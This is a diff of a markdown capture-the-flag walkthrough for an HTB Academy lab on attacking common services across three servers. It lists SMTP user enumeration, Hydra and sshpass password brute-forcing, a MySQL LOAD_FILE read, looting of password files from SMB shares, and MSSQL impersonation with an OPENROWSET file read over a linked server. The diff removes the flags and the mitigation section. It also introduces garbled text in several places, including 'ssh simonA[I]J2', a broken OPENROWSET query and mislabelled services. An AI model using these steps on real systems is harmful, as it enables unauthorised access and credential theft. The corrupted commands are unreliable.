@@ -1,17 +1,16 @@
 # HTB Academy - Attacking Common Services - Complete Walkthrough
 
 ## Overview
-
 This writeup covers the complete exploitation path for three interconnected servers in the **Attacking Common Services - Hard** module on HTB Academy. The goal was to enumerate services, find credentials, gain access, and escalate privileges to read the flag on the Administrator's desktop.
 
 ---
 
-## Server 1: `10.129.203.7` (WIN-EASY)
+## Server 1: `WIN-EASY`
 
 ### Nmap Scan
 
 ```bash
-nmap -p- -T4 10.129.203.7
+nmap -p- -T4 [IP1]
 ```
 
 **Open Ports:**
@@ -20,18 +19,16 @@ nmap -p- -T4 10.129.203.7
 - 80/tcp - HTTP (Apache 2.4.53 / PHP 7.4.29)
 - 443/tcp - HTTPS (Self-signed SSL)
 - 587/tcp - SMTP (hMailServer)
-- 3306/tcp - MySQL (MariaDB <br />
-10.4.24)
+- 3306/tcp - MySQL (MariaDB 10.4.24)
 - 3389/tcp - RDP (Windows Server 2019)
 
 ---
 
 ### Step 1: SMTP User Enumeration
-
-SMTP was vulnerable to user enumeration using the `RCPT TO` method.
+SmTP was vulnerable to user enumeration using the `RCPT TO` method.
 
 ```bash
-smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -D inlanefreight.htb -t 10.129.203.7
+smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -D inlanefreight.htb -t [IP1]
 ```
 
 **Found user:** `fiona@inlanefreight.htb`
@@ -39,11 +36,10 @@ smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-
 ---
 
 ### Step 2: Brute-Force SMTP Password
-
 Used Hydra to brute-force the password for Fiona.
 
 ```bash
-hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.7
+hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://[IP1]
 ```
 
 **Credentials Found:**
@@ -54,11 +50,10 @@ fiona@inlanefreight.htb:987654321
 ---
 
 ### Step 3: MySQL Access
-
 Connected to MySQL using the discovered credentials. Note the `--skip-ssl` flag due to TLS requirement.
 
 ```bash
-mysql -h 10.129.203.7 -u fiona -p987654321 --skip-ssl
+mysql -h [IP2] -u fiona -p987654321 --skip-ssl
 ```
 
 ---
@@ -76,37 +71,32 @@ SHOW VARIABLES LIKE "secure_file_priv";
 ### Step 5: Reading the Flag
 
 ```sql
-SELECT LOAD_FILE(":/Users/Administrator/Desktop/flag.txt");
+SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
 ```
-
-**Flag:**
-```HTB{...}
-```
-
 ---
 
-## Server 2: `10.129.168.121` (LINUX-MEDIUM)
+## Server 2: `LINUX-MEDIUM`
 
 ### Nmap Scan
 
 ```bash
-nmap -p- -T4 10.129.168.121
+nmap -p- -T4 [IP2]
 ```
 
-**Open Ports:**
+*Open Ports:**
 - 22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)
 -53/tcp - DS (ISC BIND 9.16.1)
 - 110/tcp - POP3 (Dovecot)
 - 995/tcp - POP3S (Dovecot)
 - 2121/tcp - FTP (ProFTPD - InlaneFTP)
-- 30021/tcp - FTP ProFTPD - Internal FTP **(Anonymous allowed!*)*
+- 30021/tcp - FTA (ProFTPD / ProFTPD_Internal FTP - **Anonymous allowed!**)
 
 ---
 
 ### Step 1: Anonymous FTP Access
 
 ```bash
-ftp 10.129.168.121 30021
+ftp [IP2] 30021
 ```
 
 **Login:** `anonymous` 
@@ -124,10 +114,11 @@ get mynotes.txt
 ```
 
 **`mynotes.txt` contents:**
-```234987123948729384293
+```
+234987123948729384293
 +23358093845098
 ThatsMyBigDog
-Rock!ng#May
+Rock!ngMay
 Puuuuuh7823328
 8Ns8j1b!23hs4921smHzwn
 237oHs71ohls18H127!!9skaP
@@ -136,13 +127,12 @@ Puuuuuh7823328
 
 ---
 
-### Step 3:
-SSH Brute-Force with Found Passwords
+### Step 3: SSH Brute-Force with Found Passwords
 
 ```bash
 for user in fiona simon root admin; do
     for pass in $(cat mynotes.txt); do
-        sshpass -p "$pass" ssh -o ConnectTimeout=2 $user@10.129.168.121 "whoami" 2>/dev/null && echo "SUCCESS: $user:$pass"
+        sshpass -p "$pass" ssh -o ConnectTimeout=2 $user@[IP2] "whoami" 2>/dev/null && echo "SUCCESS: $user:$pass"
     done
 done
 ```
@@ -157,7 +147,7 @@ simon:8Ns8j1b!23hs4921smHzwn
 ### Step 4: SSH Login
 
 ```bash
-ssh simon@10.129.168.121
+ssh simonA[I]J2
 ```
 
 ---
@@ -168,33 +158,193 @@ ssh simon@10.129.168.121
 ls
 cat flag.txt
 ```
-
-**Flag:* 
-```
-HTB{1qay2wsx3EDC4rfv_M3D1UM}
-```
-
 ---
 
-## Server 3: `10.129.203.10` (WIN-HARD)
+## Server 3: `WIN-HARD`
 
 ### Nmap Scan
 
 ```bash
-nmap -p- -T4 10.129.203.10
+nmap -p- -T4 [IP3]
 ```
 
 *Open Ports:**
 - 135/tcp - msrpc (Windows RPC)
--445/tcp - SMB (Microsoft-DS)
----- → the final flag:
+- 445/tcp - SMB (Microsoft-DS)
+- 1433/tcp - MSSQL 
+Microsoft SQL Server 2019)
+- 3389/tcp - RDP 
+indows Server 2019)
+
+---
+
+### Step 1: SMB Enumeration
 
 ```bash
-HTB{46u$!n9_1!nk3d_$3rv3r$s}
+smbclient -L //[IP3] -N
+```
+
+**Found Shares:** 
+- `ADMIN$`
+- C$`
+- `Home` ← **Target**
+- `IPC$`
+
+---
+
+### Step 2: Accessing SMB Share
+
+```bash
+smbclient //[IP3]/Home -U fiona -p '48Ns72!bns74@S84NNNSl'
+```
+
+*Found Directories:*
+- `HR`
+- `IT` (containing Fiona, John, Simon folders)
+- `OPS`
+- `Projects`
+
+---
+
+### Step 3: Downloading Files
+
+```bash
+cd IT/Fiona
+get creds.txt
+
+cd ../John
+get information.txt
+get notes.txt
+get secrets.txt
+
+cd ../Simon
+get random.txt
+```
+
+**`creds.txt` (Fiona):** 
+```
+Windows Creds
+
+kAkd03S@@!#
+48Ns72!bns74@S84NNNSl
+SecurePassword!
+Password123!
+SecureLocationforPasswordsd123!!
+```
+
+**secrets.txt` (John):**
+```
+Password Lists:
+
+1234567
+(DK02ka-dsaldS
+Inlanefreight2022
+Inlanefreight2022!
+TestingDB123
+```
+
+**random.txt` (Simon):** 
+```
+Credentials
+
+(k20ASD10934kadA
+KDIlalsa9020$
+JT9ads02lasSA@
+Kaksd032klasdA#
+LKads9kasd0-@
+```
+
+**information.txt` (John):**
+```
+To do:
+- Keep testing with the database.
+- Create a local linked server.
+- Simulate Impersonation.
 ```
 
 ---
 
+### Step 4: RDL Login as Fiona
+
+```bash
+xfreerdp /v:[IP3] /u:fiona /p:'48Ns72!bns74@S84NNNSl' +cert-ignore
+```
+
+---
+
+### Step 5: SQL Server Enumeration
+From the RDP session, opened `sqlcmd`:
+
+```cmd
+sqlcmd -S localhost -E
+```
+
+**Check users:**
+
+```sql
+SELECT name, type_desc FROM sys.sql_logins;
+```
+
+**Result:**
+```
+sa           SQL_LOGIN
+john        SL_LOGIN
+simon        SQL_LOGIN
+```
+
+---
+
+### Step 6: Check Impersonation Permissions
+
+```sql
+SELECT 
+    p.name AS grantee,
+    permission_name
+FROM sys.server_permissions perm
+JOIN sys.server_principals p ON perm.grantee_principal_id = p.principal_id
+WHERE permission_name = 'IMPERSONATE';
+```
+
+**Result:**
+```
+WINSRV02\Database Readers    IMPERSONATE
+```
+
+---
+
+### Step 7: Find Linked Servers
+
+```sql
+SELECT name, product, provider, data_source FROM sys.servers;
+```
+
+**Result:** 
+```
+LOCAL.TEST.LINKED.SRV    SQL Server    SMQLCLI    LOCAL.TEST.LINKED.SRV
+```
+
+---
+
+### Step 8: Impersonate `john`
+
+```sql
+EXECUTE AS LOGIN = 'john';
+GO
+SELECT SYSTEM_USER;
+GO
+```
+
+**Result:** `john`
+
+---
+
+### Step 9: Read Flag via Linked Server
+
+```sql
+EXECUTE ('select * from OPENROWSET BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents) AT [local.test.linked.srv];
+GO
+```
+---
 
 ## Summary of Credentials
 
@@ -216,7 +366,7 @@ HTB{46u$!n9_1!nk3d_$3rv3r$s}
 Y. *RDP* access with discovered credentials
 7. *SQL Server Impersonation* (`EXECUTE AS`)
 8. *Linked Servers* for privilege escalation
-9. *`OPENROWSET(BULK ...)` for file read without `xp_cmdshell`
+9. *`Openrowset(bulk ...)` for file read without `xp_cmdshell`
 
 ---
 
@@ -233,19 +383,3 @@ Y. *RDP* access with discovered credentials
 - sshpass
 
 ---
-
-## Prevention & Mitigation
-
-- Disable SMTP user enumeration (`VRVY`/`RCPT TO` restrictions)
-- Use strong passwords and MFA
-- Restrict MySQL `secure_file_priv`
-- Disable anonymous FTP access
-- Properly configure SMB shares
-- Limit SQL Server `IMPERSONATE` permissions
-- Audit linked server configurations
-- Disable `OPENROWSET`if not needed
-- Apply least privilege principle
-
----
-
-**End of Walkthrough**
